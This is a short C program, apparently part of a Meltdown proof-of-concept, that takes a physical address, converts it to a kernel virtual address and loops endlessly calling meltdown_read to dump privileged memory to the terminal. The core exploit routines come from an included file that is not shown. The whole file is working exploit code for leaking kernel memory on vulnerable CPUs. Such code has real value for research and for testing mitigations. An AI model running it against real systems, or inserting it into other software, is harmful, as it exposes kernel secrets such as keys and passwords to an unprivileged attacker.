#include "meltdown.c"

int main(int argc, char *argv[]) {
	uint64_t phys;
	if (argc < 2) {
		printf("Usage: %s <physical address> [<direct physical map>]\n", argv[0]);
		return 0;
	}
	phys = strtoull(argv[1], NULL, 0);

	meltdown_init();

	uint64_t vaddr = physical_to_virtual(phys);
	printf("\x1b[32;1m[+]\x1b[0m Physical address       : \x1b[33;1m0x%zx\x1b[0m\n", phys);
	printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: \x1b[33;1m0x%zx\x1b[0m\n\n", vaddr);

	while (1) {
		int value = meltdown_read(vaddr);
		printf("%c", value);
		fflush(stdout);
		vaddr++;
	}

	meltdown_exit();

	return 0;
}
